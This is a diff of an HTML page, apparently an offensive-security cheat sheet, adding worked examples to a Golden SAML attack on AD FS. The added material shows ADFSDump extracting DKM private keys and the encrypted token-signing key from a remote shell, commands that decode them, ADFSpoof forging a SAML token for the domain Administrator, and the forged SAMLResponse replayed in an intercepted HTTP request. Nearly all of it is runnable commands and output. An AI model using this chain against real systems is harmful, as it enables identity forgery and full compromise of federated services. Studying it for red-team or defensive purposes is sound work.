@@ -331,19 +331,104 @@ body.dark-mode #dynamicFormContainer button:hover {
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-dump-encrypted-pfx-and-dkm-key">1. Dump encrypted PFX and DKM key</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With ADFS service account
 </span></span><span class="line"><span class="cl"><span class="go">.\ADFSDump.exe
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt; .\ADFSDump.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">    ___    ____  ___________ ____
+</span></span></span><span class="line"><span class="cl"><span class="go">   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
+</span></span></span><span class="line"><span class="cl"><span class="go">  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
+</span></span></span><span class="line"><span class="cl"><span class="go"> / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
+</span></span></span><span class="line"><span class="cl"><span class="go">/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/
+</span></span></span><span class="line"><span class="cl"><span class="go">                                              /_/
+</span></span></span><span class="line"><span class="cl"><span class="go">Created by @doughsec
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1"># Extracting Private Key from Active Directory Store</span>
+</span></span><span class="line"><span class="cl"><span class="go">[-] Domain is example.com
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1"># Reading Encrypted Signing Key from Database</span>
+</span></span><span class="line"><span class="cl"><span class="go">[-] Encrypted Token Signing Key Begin
+</span></span></span><span class="line"><span class="cl"><span class="go">AAAAAQAAAA ...[SNIP]... EsNEUSTXxm
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Encrypted Token Signing Key End
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Store location value: CurrentUser
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Store name value: My
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1"># Reading The Issuer Identifier</span>
+</span></span><span class="line"><span class="cl"><span class="go">[-] Issuer Identifier: http://federation.example.com/adfs/services/trust
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Detected AD FS 2019
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Uncharted territory! This might not work...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span><span class="c1"># Reading Relying Party Trust Information from Database</span>
+</span></span><span class="line"><span class="cl"><span class="go">[-]
+</span></span></span><span class="line"><span class="cl"><span class="go">core.example.com
+</span></span></span><span class="line"><span class="cl"><span class="go"> ==================
+</span></span></span><span class="line"><span class="cl"><span class="go">    Enabled: True
+</span></span></span><span class="line"><span class="cl"><span class="go">    Sign-In Protocol: SAML 2.0
+</span></span></span><span class="line"><span class="cl"><span class="go">    Sign-In Endpoint: https://core.example.com:8443/adfs/saml/postResponse
+</span></span></span><span class="line"><span class="cl"><span class="go">    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
+</span></span></span><span class="line"><span class="cl"><span class="go">    SamlResponseSignatureType: 1;
+</span></span></span><span class="line"><span class="cl"><span class="go">    Identifier: https://core.example.com:8443
+</span></span></span><span class="line"><span class="cl"><span class="go">    Access Policy: &lt;PolicyMetadata xmlns:i=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns=&#34;http://schemas.datacontract.org/2012/04/ADFS&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">  &lt;RequireFreshAuthentication&gt;false&lt;/RequireFreshAuthentication&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">  &lt;IssuanceAuthorizationRules&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">    &lt;Rule&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">      &lt;Conditions&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">        &lt;Condition i:type=&#34;AlwaysCondition&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">          &lt;Operator&gt;IsPresent&lt;/Operator&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">        &lt;/Condition&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">      &lt;/Conditions&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">    &lt;/Rule&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">  &lt;/IssuanceAuthorizationRules&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">&lt;/PolicyMetadata&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Access Policy Parameter:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Issuance Rules: @RuleTemplate = &#34;LdapClaims&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">@RuleName = &#34;LdapClaims&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">c:[Type == &#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&#34;, Issuer == &#34;AD AUTHORITY&#34;]
+</span></span></span><span class="line"><span class="cl"><span class="go"> =&gt; issue(store = &#34;Active Directory&#34;, types = (&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&#34;, &#34;http://schemas.xmlsoap.org/claims/CommonName&#34;), query = &#34;;userPrincipalName,sAMAccountName;{0}&#34;, param = c.Value);
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/mandiant/ADFSDump">ADFSDump</a></em></small></p>
 <h4 id="2-convert-to-binary-blob">2. Convert to binary blob</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy private key<span class="o">(</span>s<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">echo &#39;&lt;PRIVATE_KEY&gt;&#39; | sed &#39;s/-//g&#39; | xxd -r -p &gt; DkmKey.bin
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End
-</span></span><span class="line"><span class="cl"><span class="go">cat b64_blob | base64 -d &gt; EncryptedPfx.bin
-</span></span></span></code></pre></div><h4 id="3-check-which-private-key-is-correct">3. Check which private key is correct</h4>
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> <span class="s1">&#39;8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/-//g&#39;</span> <span class="p">|</span> xxd -r -p &gt; DkmKey.bin
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End
+</span></span><span class="line"><span class="cl"><span class="go">echo -n &#39;&lt;B64_ENCRYPTED_TOKEN&gt;&#39; | base64 -d &gt; EncryptedPfx.bin
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> -n <span class="s1">&#39;AAAAAQAAAA ...[SNIP]... EsNEUSTXxm&#39;</span> <span class="p">|</span> base64 -d &gt; EncryptedPfx.bin
+</span></span></code></pre></div><h4 id="3-check-which-private-key-is-correct">3. Check which private key is correct</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> The correct key will not show error
 </span></span><span class="line"><span class="cl"><span class="go">python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin dump
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin dump
+</span></span><span class="line"><span class="cl"><span class="go">    ___    ____  ___________                   ____
+</span></span></span><span class="line"><span class="cl"><span class="go">   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
+</span></span></span><span class="line"><span class="cl"><span class="go">  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
+</span></span></span><span class="line"><span class="cl"><span class="go"> / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
+</span></span></span><span class="line"><span class="cl"><span class="go">/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
+</span></span></span><span class="line"><span class="cl"><span class="go">                        /_/                        
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">A tool to for AD FS security tokens
+</span></span></span><span class="line"><span class="cl"><span class="go">Created by @doughsec
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/mandiant/ADFSpoof">ADFSpoof</a></em></small></p>
 <h4 id="4-generate-saml-20-token">4. Generate SAML 2.0 token</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy info from ADFS dump
 </span></span><span class="line"><span class="cl"><span class="go">python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s &lt;SERVER&gt; saml2 --endpoint &lt;SIGN_IN_ENDPOINT&gt; --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid &lt;SPOOF_USER&gt;@&lt;DOMAIN&gt; --rpidentifier &lt;IDENTIFIER&gt; --assertions &#39;&lt;Attribute Name=&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&#34;&gt;&lt;AttributeValue&gt;&lt;SPOOF_USER&gt;@&lt;DOMAIN&gt;&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name=&#34;http://schemas.xmlsoap.org/claims/CommonName&#34;&gt;&lt;AttributeValue&gt;&lt;SPOOF_USER&gt;&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#39; 
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s core.example.com saml2 --endpoint https://core.example.com:8443/adfs/saml/postResponse --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid Administrator@example.com --rpidentifier https://core.example.com:8443 --assertions <span class="s1">&#39;&lt;Attribute Name=&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&#34;&gt;&lt;AttributeValue&gt;Administrator@example.com&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name=&#34;http://schemas.xmlsoap.org/claims/CommonName&#34;&gt;&lt;AttributeValue&gt;Administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">    ___    ____  ___________                   ____
+</span></span></span><span class="line"><span class="cl"><span class="go">   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
+</span></span></span><span class="line"><span class="cl"><span class="go">  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
+</span></span></span><span class="line"><span class="cl"><span class="go"> / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
+</span></span></span><span class="line"><span class="cl"><span class="go">/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
+</span></span></span><span class="line"><span class="cl"><span class="go">                        /_/                        
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">A tool to for AD FS security tokens
+</span></span></span><span class="line"><span class="cl"><span class="go">Created by @doughsec
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PHNhbWxwOl ...[SNIP]... c3BvbnNlPg%3D%3D
 </span></span></span></code></pre></div><h4 id="5-modify-request-in-burpsuite">5. Modify request in BurpSuite</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+-------------------------------------------------------------+
 </span></span></span><span class="line"><span class="cl"><span class="go">| 1. Enable Intercept in Proxy Tab                            |
@@ -352,6 +437,24 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">| 4. Replace the payload and Forward                          |
 </span></span></span><span class="line"><span class="cl"><span class="go">| 5. Disable Intercept and profit                             |
 </span></span></span><span class="line"><span class="cl"><span class="go">+-------------------------------------------------------------+
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">POST /adfs/saml/postResponse HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="go">Host: core.example.com:8443
+</span></span></span><span class="line"><span class="cl"><span class="go">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span></span></span><span class="line"><span class="cl"><span class="go">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span></span><span class="line"><span class="cl"><span class="go">Accept-Language: en-US,en;q=0.5
+</span></span></span><span class="line"><span class="cl"><span class="go">Accept-Encoding: gzip, deflate, br
+</span></span></span><span class="line"><span class="cl"><span class="go">Content-Type: application/x-www-form-urlencoded
+</span></span></span><span class="line"><span class="cl"><span class="go">Content-Length: 6753
+</span></span></span><span class="line"><span class="cl"><span class="go">Origin: https://federation.example.com
+</span></span></span><span class="line"><span class="cl"><span class="go">Referer: https://federation.example.com/
+</span></span></span><span class="line"><span class="cl"><span class="go">Upgrade-Insecure-Requests: 1
+</span></span></span><span class="line"><span class="cl"><span class="go">Sec-Fetch-Dest: document
+</span></span></span><span class="line"><span class="cl"><span class="go">Sec-Fetch-Mode: navigate
+</span></span></span><span class="line"><span class="cl"><span class="go">Sec-Fetch-Site: same-site
+</span></span></span><span class="line"><span class="cl"><span class="go">Te: trailers
+</span></span></span><span class="line"><span class="cl"><span class="go">Connection: close
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SAMLResponse=PHNhbWxwOl ...[SNIP]... c3BvbnNlPg%3D%3D
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
